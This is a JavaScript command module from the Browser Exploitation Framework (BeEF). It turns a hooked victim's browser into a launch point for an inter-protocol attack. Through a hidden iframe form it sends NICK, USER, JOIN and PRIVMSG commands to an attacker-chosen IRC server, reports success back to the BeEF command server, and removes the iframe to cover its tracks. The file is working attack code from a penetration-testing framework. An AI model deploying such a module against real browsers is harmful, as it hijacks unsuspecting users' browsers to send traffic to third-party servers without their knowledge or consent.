//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Inter protocol IRC module
 * Developed by jgaliana
 *
 * It is known that some IRC servers have protections against browser's connections in order to prevent attacks seen in the wild
 * http://www.theregister.co.uk/2010/01/30/firefox_interprotocol_attack/
 */
beef.execute(function() {

	var rhost   = '<%= @rhost %>';
	var rport   = '<%= @rport %>';
	var nick    = '<%= @nick %>';
	var channel = '<%= @channel %>';
	var message = '<%= @message %>';

	var irc_commands = "NICK " + nick + "\n";
	irc_commands    += "USER " + nick + " 8 * : " + nick + " user\n";
	irc_commands    += "JOIN " + channel + "\n";
	irc_commands    += "PRIVMSG " + channel + " :" + message + "\nQUIT\n";

	// send commands
	var irc_iframe_<%= @command_id %> = beef.dom.createIframeIpecForm(rhost, rport, "/index.html", irc_commands);
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IRC command sent");

	// clean up
	cleanup = function() {
		document.body.removeChild(irc_iframe_<%= @command_id %>);
	}
	setTimeout("cleanup()", 15000);

});
